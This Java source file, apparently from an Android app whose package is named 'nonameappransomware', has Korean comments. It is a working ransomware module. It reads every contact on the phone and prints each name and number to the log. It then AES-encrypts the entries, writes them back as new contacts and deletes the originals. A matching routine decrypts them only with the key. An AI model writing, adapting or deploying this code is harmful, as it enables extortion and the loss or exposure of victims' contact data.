package com.example.nonameappransomware;

import android.content.ContentProviderOperation;
import android.content.ContentResolver;
import android.content.Context;
import android.content.OperationApplicationException;
import android.database.Cursor;
import android.os.RemoteException;
import android.provider.ContactsContract;

import java.util.ArrayList;
import java.util.List;

import javax.crypto.SecretKey;

public class ContactEncryptionUtils {

    private SecretKey encryptionKey;
    private byte[] encryptionIv;
    private Context context;

    public ContactEncryptionUtils(Context context, SecretKey key, byte[] iv) {
        this.context = context;
        this.encryptionKey = key;
        this.encryptionIv = iv;
    }
    // 전화번호부 관련 함수
    // 전화번호부 데이터 가져오기
    public List<Contact> getContacts() {
        List<Contact> contacts = new ArrayList<>();
        String[] projection = new String[]{
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER
        };
        ContentResolver contentResolver = context.getContentResolver();
        Cursor cursor = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, projection, null, null, null);
        if (cursor != null) {
            int nameIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
            int numberIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);

            while (cursor.moveToNext()) {
                String name = cursor.getString(nameIndex);
                String phoneNumber = cursor.getString(numberIndex);
                contacts.add(new Contact(name, phoneNumber));
                System.out.println("Contact name: " + name + " , Contact phoneNumber: " + phoneNumber);
            }
            cursor.close();
        }
        System.out.println("Success Get Contact");
        return contacts;
    }
    // 전화번호부 데이터 암호화 및 저장
    public void encryptAndSaveContacts(List<Contact> contacts) {
        for (Contact contact : contacts) {
            try {
                String encryptedName = AESUtil.encryptContact(contact.getName(), encryptionKey, encryptionIv);
                String encryptedPhoneNumber = AESUtil.encryptContact(contact.getPhoneNumber(), encryptionKey, encryptionIv);

                // Save encrypted contact
                saveEncryptedContact(encryptedName, encryptedPhoneNumber);
                System.out.println("Success encrypt Contact");

                // Delete original contact
                deleteOriginalContact(contact.getName(), contact.getPhoneNumber());
            } catch (Exception e) {
                e.printStackTrace();
                System.err.println("Failed to save encrypted Contact");
            }
        }
    }


    // 전화번호부 데이터 복호화
    public void unlockContacts() {
        String[] projection = new String[]{
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER
        };
        ContentResolver contentResolver = context.getContentResolver();
        Cursor cursor = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, projection, null, null, null);

        if (cursor != null) {
            int nameIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
            int numberIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);

            while (cursor.moveToNext()) {
                String encryptedName = cursor.getString(nameIndex);
                String encryptedPhoneNumber = cursor.getString(numberIndex);

                try {
                    String decryptedName = AESUtil.decryptContact(encryptedName, encryptionKey, encryptionIv);
                    String decryptedPhoneNumber = AESUtil.decryptContact(encryptedPhoneNumber, encryptionKey, encryptionIv);

                    // Update contact with decrypted data
                    updateContact(encryptedName, encryptedPhoneNumber, decryptedName, decryptedPhoneNumber);
                    System.out.println("Success decrypt Contact");

                    // Delete encrypted contact

                } catch (Exception e) {
                    e.printStackTrace();
                    System.err.println("Failed to update decrypted Contact");
                }
            }
            cursor.close();
        }
    }


    // 원본 연락처 삭제
    private void deleteOriginalContact(String name, String phoneNumber) {
        ContentResolver contentResolver = context.getContentResolver();
        String where = ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " = ? AND " +
                ContactsContract.CommonDataKinds.Phone.NUMBER + " = ?";
        String[] selectionArgs = {name, phoneNumber};

        // 필요한 열을 포함한 쿼리 수행
        String[] projection = {
                ContactsContract.CommonDataKinds.Phone._ID, // 연락처 ID
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER,
                ContactsContract.CommonDataKinds.Phone.RAW_CONTACT_ID // Raw 연락처 ID
        };

        Cursor cursor = contentResolver.query(ContactsContract.Data.CONTENT_URI, projection, where, selectionArgs, null);
        if (cursor != null) {
            while (cursor.moveToNext()) {
                int rawContactIdIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.RAW_CONTACT_ID);
                long contactId = cursor.getLong(rawContactIdIndex);
                deleteContactById(contactId);
            }
            cursor.close();
        }
    }

    // 연락처 ID로 삭제
    private void deleteContactById(long contactId) {
        ContentResolver contentResolver = context.getContentResolver();
        String where = ContactsContract.RawContacts._ID + " = ?";
        String[] selectionArgs = {String.valueOf(contactId)};

        int deletedRows = contentResolver.delete(ContactsContract.RawContacts.CONTENT_URI, where, selectionArgs);
        if (deletedRows > 0) {
            System.out.println("Successfully deleted original contact");
        } else {
            System.out.println("Failed to delete original contact");
        }
    }

    // 암호화된 전화번호부 데이터 저장
    private void saveEncryptedContact(String encryptedName, String encryptedPhoneNumber) {

        ArrayList<ContentProviderOperation> ops = new ArrayList<>();

        // 새 연락처를 위한 RawContact 추가
        ops.add(ContentProviderOperation.newInsert(ContactsContract.RawContacts.CONTENT_URI)
                .withValue(ContactsContract.RawContacts.ACCOUNT_TYPE, null)
                .withValue(ContactsContract.RawContacts.ACCOUNT_NAME, null)
                .build());

        // 이름 추가
        ops.add(ContentProviderOperation.newInsert(ContactsContract.Data.CONTENT_URI)
                .withValueBackReference(ContactsContract.Data.RAW_CONTACT_ID, 0)
                .withValue(ContactsContract.Data.MIMETYPE, ContactsContract.CommonDataKinds.StructuredName.CONTENT_ITEM_TYPE)
                .withValue(ContactsContract.CommonDataKinds.StructuredName.DISPLAY_NAME, encryptedName)
                .build());

        // 전화번호 추가
        ops.add(ContentProviderOperation.newInsert(ContactsContract.Data.CONTENT_URI)
                .withValueBackReference(ContactsContract.Data.RAW_CONTACT_ID, 0)
                .withValue(ContactsContract.Data.MIMETYPE, ContactsContract.CommonDataKinds.Phone.CONTENT_ITEM_TYPE)
                .withValue(ContactsContract.CommonDataKinds.Phone.NUMBER, encryptedPhoneNumber)
                .withValue(ContactsContract.CommonDataKinds.Phone.TYPE, ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE)
                .build());

        try {
            // 일괄 작업 실행
            context.getContentResolver().applyBatch(ContactsContract.AUTHORITY, ops);
            System.out.println("Success Save Encrypted Contact");
        } catch (RemoteException | OperationApplicationException e) {
            e.printStackTrace();
            System.out.println("Failed to save encrypted contact");
        }

        System.out.println("Success Save Encrypted Contact");
    }

    // 복호화된 전화번호부 데이터 업데이트
    private void updateContact(String encryptedName, String encryptedPhoneNumber, String decryptedName, String decryptedPhoneNumber) {
        ArrayList<ContentProviderOperation> ops = new ArrayList<>();

        // RawContact ID 찾기
        String rawContactId = getRawContactId(encryptedName, encryptedPhoneNumber);
        if (rawContactId == null) {
            System.out.println("Contact not found");
            return;
        }

        // 이름 업데이트
        ops.add(ContentProviderOperation.newUpdate(ContactsContract.Data.CONTENT_URI)
                .withSelection(ContactsContract.Data.RAW_CONTACT_ID + " = ? AND " +
                                ContactsContract.Data.MIMETYPE + " = ?",
                        new String[]{rawContactId, ContactsContract.CommonDataKinds.StructuredName.CONTENT_ITEM_TYPE})
                .withValue(ContactsContract.CommonDataKinds.StructuredName.DISPLAY_NAME, decryptedName)
                .build());

        // 전화번호 업데이트
        ops.add(ContentProviderOperation.newUpdate(ContactsContract.Data.CONTENT_URI)
                .withSelection(ContactsContract.Data.RAW_CONTACT_ID + " = ? AND " +
                                ContactsContract.Data.MIMETYPE + " = ?",
                        new String[]{rawContactId, ContactsContract.CommonDataKinds.Phone.CONTENT_ITEM_TYPE})
                .withValue(ContactsContract.CommonDataKinds.Phone.NUMBER, decryptedPhoneNumber)
                .build());

        try {
            // 일괄 작업 실행
            context.getContentResolver().applyBatch(ContactsContract.AUTHORITY, ops);
            System.out.println("Success Update Decrypted Contact");
        } catch (RemoteException e) {
            e.printStackTrace();
            System.out.println("RemoteException: Failed to update decrypted contact");
        } catch (OperationApplicationException e) {
            e.printStackTrace();
            System.out.println("OperationApplicationException: Failed to update decrypted contact");
        } catch (Exception e) {
            e.printStackTrace();
            System.out.println("Exception: Failed to update decrypted contact");
        }
    }

    // Raw Contact ID 찾기
    private String getRawContactId(String encryptedName, String encryptedPhoneNumber) {
        String rawContactId = null;
        ContentResolver contentResolver = context.getContentResolver();
        String[] projection = new String[]{
                ContactsContract.Data.RAW_CONTACT_ID,
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER
        };
        String selection = ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " = ? AND " +
                ContactsContract.CommonDataKinds.Phone.NUMBER + " = ?";
        String[] selectionArgs = {encryptedName, encryptedPhoneNumber};

        Cursor cursor = contentResolver.query(ContactsContract.Data.CONTENT_URI, projection, selection, selectionArgs, null);
        if (cursor != null) {
            int rawContactIdIndex = cursor.getColumnIndex(ContactsContract.Data.RAW_CONTACT_ID);
            if (cursor.moveToFirst() && rawContactIdIndex != -1) {
                rawContactId = cursor.getString(rawContactIdIndex);
            } else {
                System.out.println("No matching contact found");
            }
            cursor.close();
        } else {
            System.out.println("Cursor is null");
        }
        return rawContactId;
    }

    public class Contact {
        private String name;
        private String phoneNumber;

        public Contact(String name, String phoneNumber) {
            this.name = name;
            this.phoneNumber = phoneNumber;
        }

        public String getName() {
            return name;
        }

        public String getPhoneNumber() {
            return phoneNumber;
        }
    }

}
